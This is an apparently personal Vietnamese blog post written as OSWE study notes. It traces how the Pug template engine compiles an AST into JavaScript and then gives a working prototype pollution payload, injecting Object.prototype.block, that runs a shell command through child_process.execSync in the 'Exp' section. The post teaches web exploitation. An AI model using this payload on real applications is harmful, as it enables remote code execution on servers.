<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>AST Injection - Nothing</title><meta name="Description" content="Nothing"><meta property="og:title" content="AST Injection" />
<meta property="og:description" content="Chỉ là note lại những gì đã học được


" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://n00b-bot.github.io/ast-injection/" /><meta property="og:image" content="https://n00b-bot.github.io/logo.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-11-06T10:55:32+07:00" />
<meta property="article:modified_time" content="2022-11-07T17:15:24+07:00" /><meta property="og:site_name" content="Nothing" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://n00b-bot.github.io/logo.png"/>

<meta name="twitter:title" content="AST Injection"/>
<meta name="twitter:description" content="Chỉ là note lại những gì đã học được


"/>
<meta name="application-name" content="Nothing">
<meta name="apple-mobile-web-app-title" content="Nothing"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://n00b-bot.github.io/ast-injection/" /><link rel="prev" href="https://n00b-bot.github.io/elasticburp-ng-part-1/" /><link rel="next" href="https://n00b-bot.github.io/oswe/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "AST Injection",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/n00b-bot.github.io\/ast-injection\/"
        },"image": [{
                            "@type": "ImageObject",
                            "url": "https:\/\/n00b-bot.github.io\/images\/Apple-Devices-Preview.png",
                            "width":  3200 ,
                            "height":  2048 
                        }],"genre": "posts","wordcount":  1243 ,
        "url": "https:\/\/n00b-bot.github.io\/ast-injection\/","datePublished": "2022-11-06T10:55:32+07:00","dateModified": "2022-11-07T17:15:24+07:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "xxxx","logo": "https:\/\/n00b-bot.github.io\/images\/avatar.png1"},"author": {
                "@type": "Person",
                "name": "Nothing"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Nothing"><span class="header-title-pre"><i class='far fa-solid fa-terminal fa-fw' aria-hidden='true'></i></span>Nothing</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/n00b-bot" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i> n00b-bot </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Nothing"><span class="header-title-pre"><i class='far fa-solid fa-terminal fa-fw' aria-hidden='true'></i></span>Nothing</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/n00b-bot" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>n00b-bot</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">AST Injection</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/n00b-bot" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Nothing</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-11-06">2022-11-06</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1243 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;<span id="/ast-injection/" class="leancloud_visitors" data-flag-title="AST Injection">
                        <i class="far fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
                    </span>&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#ast-là-gì">AST là gì</a></li>
    <li><a href="#pug-template-engines">Pug Template Engines</a></li>
    <li><a href="#exp">Exp</a></li>
    <li><a href="#tham-khảo">Tham khảo</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h1>Chỉ là note lại những gì đã học được</h1>
<p align="center">
<a href="https://hits.seeyoufarm.com"><img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fn00b-bot.com%2Fast-injection%2F&count_bg=%2379C83D&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=hits&edge_flat=false"/></a>
</p>
<p>Trong khi đang speedrun OSWE đến những chương cuối của OSWE thì tôi gặp dạng bài Prototype Pollution (dạng bài mà tôi trước giờ chỉ copy &amp; paste payload như 1 thằng n00b , anyway bây giờ vẫn là 1 thằng n00b) và nếu muốn rõ về cách payload hoạt động như thế nào thì tôi lại phải đi học Javascript. Một ngôn ngữ tôi không thích lắm vì logic ảo ma của nó nhưng biết sao giờ chẳng lẽ lại bỏ qua chương này và thế là lại phải học thôi !!</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/ast-injection/contrai.gif"
        data-srcset="/ast-injection/contrai.gif, /ast-injection/contrai.gif 1.5x, /ast-injection/contrai.gif 2x"
        data-sizes="auto"
        alt="/ast-injection/contrai.gif"
        title="/ast-injection/contrai.gif" width="480" height="270" /></p>
<h2 id="ast-là-gì">AST là gì</h2>
<p>Hiểu đơn giản AST (Abstract Syntax Tree) là cây biểu diễn cấu trúc cú pháp của mã nguồn của một 
ngôn ngữ nhất định ( <a href="https://www.twilio.com/blog/abstract-syntax-trees" target="_blank" rel="noopener noreffer ">Chi tiết</a> )
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/ast-injection/ast.png"
        data-srcset="/ast-injection/ast.png, /ast-injection/ast.png 1.5x, /ast-injection/ast.png 2x"
        data-sizes="auto"
        alt="/ast-injection/ast.png"
        title="/ast-injection/ast.png" width="1600" height="448" />
AST được sử dụng thường xuyên trong JS ví dụ như: template engines, typescript, &hellip; ( tôi cũng không rõ dùng ở typescript chỗ nào vì đọc nó bảo thế thì list nhìn cho nó dài thôi 🙃). Trong bài này thì ta tập trung vào template engines. Flow chung cho template engines như ảnh dưới đây:
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/ast-injection/template.jpg"
        data-srcset="/ast-injection/template.jpg, /ast-injection/template.jpg 1.5x, /ast-injection/template.jpg 2x"
        data-sizes="auto"
        alt="/ast-injection/template.jpg"
        title="/ast-injection/template.jpg" width="2073" height="993" /></p>
<h2 id="pug-template-engines">Pug Template Engines</h2>
<p>Trong bài này ta sẽ đi vào cụ thể một template engines đó là Pug vì đây là một trong nững template engines khá phổ biến của JS. Flow của Pug như sau:
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/ast-injection/pugast.jpg"
        data-srcset="/ast-injection/pugast.jpg, /ast-injection/pugast.jpg 1.5x, /ast-injection/pugast.jpg 2x"
        data-sizes="auto"
        alt="/ast-injection/pugast.jpg"
        title="/ast-injection/pugast.jpg" width="2076" height="996" />
Đầu tiên chúng ta xem cách khai báo để tạo ra một template.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">const pug = require(&#39;pug&#39;);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// Compile the source code
</span></span><span class="line"><span class="cl">const compiledFunction = pug.compileFile(&#39;template.pug&#39;);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// Render a set of data
</span></span><span class="line"><span class="cl">console.log(compiledFunction({
</span></span><span class="line"><span class="cl">  name: &#39;Timothy&#39;
</span></span><span class="line"><span class="cl">}));
</span></span><span class="line"><span class="cl">// &#34;&lt;p&gt;Timothy&#39;s Pug source code!&lt;/p&gt;&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// Render another set of data
</span></span><span class="line"><span class="cl">console.log(compiledFunction({
</span></span><span class="line"><span class="cl">  name: &#39;Forbes&#39;
</span></span><span class="line"><span class="cl">}));
</span></span><span class="line"><span class="cl">// &#34;&lt;p&gt;Forbes&#39;s Pug source code!&lt;/p&gt;&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ở đây nhận tham số đầu vào là một file có chứa các cú pháp của Pug. Sau khi xem xét qua hàm thì tôi tóm gọn lại là flow như sau <strong>compileFile =&gt; handleTemplateCache =&gt; compile</strong> nên chúng ta sẽ bắt đầu từ hàm compile(/pug/lib/index.js).</p>
<p>Trong hàm <strong>compile</strong> sẽ gọi đến hàm <strong>compileBody</strong> (hàm này trả về 1 object có thuộc tính <em>body</em> chứa code JS được tạo ra)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">function compileBody(str, options) {
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">  var ast = load.string(str, { //magic })
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">  return {body: js, dependencies: dependencies};
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Tiếp tục gọi đến hàm <strong>load</strong> và 1 cách magic ta có được giá trị AST. Sau khi có AST thì nó được truyền vào hàm <strong>generateCode</strong> (như cái tên của nó hàm này trả về code JS được tạo bởi AST)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">var js = (findReplacementFunc(plugins, &#39;generateCode&#39;) || generateCode)(ast, {
</span></span><span class="line"><span class="cl">    pretty: options.pretty,
</span></span><span class="line"><span class="cl">    compileDebug: options.compileDebug,
</span></span><span class="line"><span class="cl">    doctype: options.doctype,
</span></span><span class="line"><span class="cl">    inlineRuntimeFunctions: options.inlineRuntimeFunctions,
</span></span><span class="line"><span class="cl">    globals: options.globals,
</span></span><span class="line"><span class="cl">    self: options.self,
</span></span><span class="line"><span class="cl">    includeSources: options.includeSources ? debug_sources : false,
</span></span><span class="line"><span class="cl">    templateName: options.templateName,
</span></span><span class="line"><span class="cl">  });
</span></span></code></pre></td></tr></table>
</div>
</div><p>Lần mò vào hàm <strong>generateCode</strong> thì hàm này tạo ra một đối tượng <strong>Compiler</strong> và gọi đến phương thức <strong>compile</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">function generateCode(ast, options) {
</span></span><span class="line"><span class="cl">  return new Compiler(ast, options).compile();
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">=&gt;
</span></span><span class="line"><span class="cl">  compile: function() {
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">    this.visit(this.node); // code được gen và đẩy vào buff ở đây
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></td></tr></table>
</div>
</div><p>Từ đây tất cả logic tạo code js từ AST đều ở đây.Ta sẽ phân tích 1 ví dụ như sau:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">const pug = require(&#39;pug&#39;);
</span></span><span class="line"><span class="cl">compiledFunction = pug.compile(&#34;nothing&#34;,{debug:true})
</span></span></code></pre></td></tr></table>
</div>
</div><p>Bây giờ giá trị của AST sẽ là:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/ast-injection/astvalue.png"
        data-srcset="/ast-injection/astvalue.png, /ast-injection/astvalue.png 1.5x, /ast-injection/astvalue.png 2x"
        data-sizes="auto"
        alt="/ast-injection/astvalue.png"
        title="/ast-injection/astvalue.png" width="894" height="615" /></p>
<p>Flow cơ bản của quá trình này là</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> visit: function(node, parent) {
</span></span><span class="line"><span class="cl">    var debug = this.debug;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    if (!node) { 
</span></span><span class="line"><span class="cl">        ... 
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    if (debug &amp;&amp; node.debug !== false &amp;&amp; node.type !== &#39;Block&#39;) {
</span></span><span class="line"><span class="cl">      if (node.line) {
</span></span><span class="line"><span class="cl">        var js = &#39;;pug_debug_line = &#39; + node.line;
</span></span><span class="line"><span class="cl">        if (node.filename)
</span></span><span class="line"><span class="cl">          js += &#39;;pug_debug_filename = &#39; + stringify(node.filename);
</span></span><span class="line"><span class="cl">        this.buf.push(js + &#39;;&#39;);
</span></span><span class="line"><span class="cl">      }
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    if (!this[&#39;visit&#39; + node.type]) { // Kiểm tra valid type của node
</span></span><span class="line"><span class="cl">    ...
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    this.visitNode(node); // gọi đến hàm gen code với các type tương ứng
</span></span><span class="line"><span class="cl">  }
</span></span></code></pre></td></tr></table>
</div>
</div><p>Một số hàm gen code với các type</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  visitText: function(text) {
</span></span><span class="line"><span class="cl">    this.buffer(text.val);
</span></span><span class="line"><span class="cl">  }
</span></span><span class="line"><span class="cl">-------------------------------------------------------
</span></span><span class="line"><span class="cl">  visitComment: function(comment) {
</span></span><span class="line"><span class="cl">    if (!comment.buffer) return;
</span></span><span class="line"><span class="cl">    if (this.pp) this.prettyIndent(1, true);
</span></span><span class="line"><span class="cl">    this.buffer(&#39;&lt;!--&#39; + comment.val + &#39;--&gt;&#39;);
</span></span><span class="line"><span class="cl">  }
</span></span><span class="line"><span class="cl">-------------------------------------------------------
</span></span><span class="line"><span class="cl">  visitCode: function(code) {
</span></span><span class="line"><span class="cl">    // Wrap code blocks with {}.
</span></span><span class="line"><span class="cl">    // we only wrap unbuffered code blocks ATM
</span></span><span class="line"><span class="cl">    // since they are usually flow control
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    // Buffer code
</span></span><span class="line"><span class="cl">    if (code.buffer) {
</span></span><span class="line"><span class="cl">      var val = code.val.trim();
</span></span><span class="line"><span class="cl">      val = &#39;null == (pug_interp = &#39; + val + &#39;) ? &#34;&#34; : pug_interp&#39;;
</span></span><span class="line"><span class="cl">      if (code.mustEscape !== false)
</span></span><span class="line"><span class="cl">        val = this.runtime(&#39;escape&#39;) + &#39;(&#39; + val + &#39;)&#39;;
</span></span><span class="line"><span class="cl">      this.bufferExpression(val);
</span></span><span class="line"><span class="cl">    } else {
</span></span><span class="line"><span class="cl">      this.buf.push(code.val);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    // Block support
</span></span><span class="line"><span class="cl">    if (code.block) {
</span></span><span class="line"><span class="cl">      if (!code.buffer) this.buf.push(&#39;{&#39;);
</span></span><span class="line"><span class="cl">      this.visit(code.block, code);
</span></span><span class="line"><span class="cl">      if (!code.buffer) this.buf.push(&#39;}&#39;);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">  },
</span></span><span class="line"><span class="cl"> 
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="exp">Exp</h2>
<p>Payload Prototype Injection</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">const pug = require(&#39;pug&#39;);
</span></span><span class="line"><span class="cl">Object.prototype.block = {&#34;type&#34;: &#34;Text&#34;, &#34;line&#34;: &#34;console.log(process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;).toString())&#34;};
</span></span><span class="line"><span class="cl">pug.compile(&#39;h1= msg&#39;, {debug:true});
</span></span></code></pre></td></tr></table>
</div>
</div><p>Template Function được trả về đã được injection</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Compiled Function:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  function template(locals) {var pug_html = &#34;&#34;, pug_mixins = {}, pug_interp;var pug_debug_filename, pug_debug_line;try {;
</span></span><span class="line"><span class="cl">      var locals_for_with = (locals || {});
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">      (function (console, msg, process) {
</span></span><span class="line"><span class="cl">        ;pug_debug_line = 1;
</span></span><span class="line"><span class="cl">  pug_html = pug_html + &#34;\u003Ch1\u003E&#34;;
</span></span><span class="line"><span class="cl">  ;pug_debug_line = 1;
</span></span><span class="line"><span class="cl">  pug_html = pug_html + (pug.escape(null == (pug_interp = msg) ? &#34;&#34; : pug_interp));
</span></span><span class="line"><span class="cl">  ;pug_debug_line = console.log(process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;).toString());
</span></span><span class="line"><span class="cl">  pug_html = pug_html + &#34;ndefine\u003C\u002Fh1\u003E&#34;;
</span></span><span class="line"><span class="cl">      }.call(this, &#34;console&#34; in locals_for_with ?
</span></span><span class="line"><span class="cl">          locals_for_with.console :
</span></span><span class="line"><span class="cl">          typeof console !== &#39;undefined&#39; ? console : undefined, &#34;msg&#34; in locals_for_with ?
</span></span><span class="line"><span class="cl">          locals_for_with.msg :
</span></span><span class="line"><span class="cl">          typeof msg !== &#39;undefined&#39; ? msg : undefined, &#34;process&#34; in locals_for_with ?
</span></span><span class="line"><span class="cl">          locals_for_with.process :
</span></span><span class="line"><span class="cl">          typeof process !== &#39;undefined&#39; ? process : undefined));
</span></span><span class="line"><span class="cl">      ;} catch (err) {pug.rethrow(err, pug_debug_filename, pug_debug_line);};return pug_html;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Lúc này trong đầu mình có câu hỏi tại sao lại là type Text chứ không phải các type khác và liệu có type nào còn có thể khai thác được không.
Sau 1 hồi debug thì mình tìm ra được các type có thể lợi dụng cần phải thỏa mãn 2 điều kiện:</p>
<ul>
<li>Có hàm visit<em>Type</em> (visitCode, visitTag, ..)</li>
<li>Thuộc các case sau để tránh gọi đến hàm walkAST 1 lần nữa và mình tìm thêm được 1 số type hợp lệ.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    case &#39;Attrs&#39;:
</span></span><span class="line"><span class="cl">    case &#39;BlockComment&#39;: // work
</span></span><span class="line"><span class="cl">    case &#39;Comment&#39;: // work
</span></span><span class="line"><span class="cl">    case &#39;Doctype&#39;: // work
</span></span><span class="line"><span class="cl">    case &#39;IncludeFilter&#39;:
</span></span><span class="line"><span class="cl">    case &#39;MixinBlock&#39;: // work
</span></span><span class="line"><span class="cl">    case &#39;YieldBlock&#39;: // work 
</span></span><span class="line"><span class="cl">    case &#39;Text&#39;: // 
</span></span><span class="line"><span class="cl">      break;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Liệu payload trên có hoạt động với mọi template không? =&gt; Câu trả lời là không nếu template không tham chiếu đến giá trị nhận từ argument.( điều này khó xảy ra vì nếu không tham chiếu đến đến các biến được truyền vào thì đã không sử dụng template từ ban đầu)
Ví dụ về một template mà payload trên không hoạt động.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pug.compile(&#39;h1&#39;, {debug:true})
</span></span><span class="line"><span class="cl">----------------------------------
</span></span><span class="line"><span class="cl">Compiled Function:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  function template(locals) {var pug_html = &#34;&#34;, pug_mixins = {}, pug_interp;var pug_debug_filename, pug_debug_line;try {;pug_debug_line = 1;
</span></span><span class="line"><span class="cl">  pug_html = pug_html + &#34;\u003Ch1\u003E\u003C\u002Fh1\u003E&#34;;} catch (err) {pug.rethrow(err, pug_debug_filename, pug_debug_line);};return pug_html;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Tuy nhiên mình phát hiện ngay cả trong trường hợp trên, ta vẫn có thể khai thác được cũng bằng Prototype Pollution và mình để tự bạn tìm ra câu trả lời cho trường hợp trên. (dễ quá nó chán lắm 😂😂)
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/ast-injection/tem.png"
        data-srcset="/ast-injection/tem.png, /ast-injection/tem.png 1.5x, /ast-injection/tem.png 2x"
        data-sizes="auto"
        alt="/ast-injection/tem.png"
        title="/ast-injection/tem.png" width="1256" height="660" /></p>
<h2 id="tham-khảo">Tham khảo</h2>
<ul>
<li><a href="https://blog.p6.is/AST-Injection/#Pug" target="_blank" rel="noopener noreffer ">https://blog.p6.is/AST-Injection/#Pug</a></li>
</ul></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
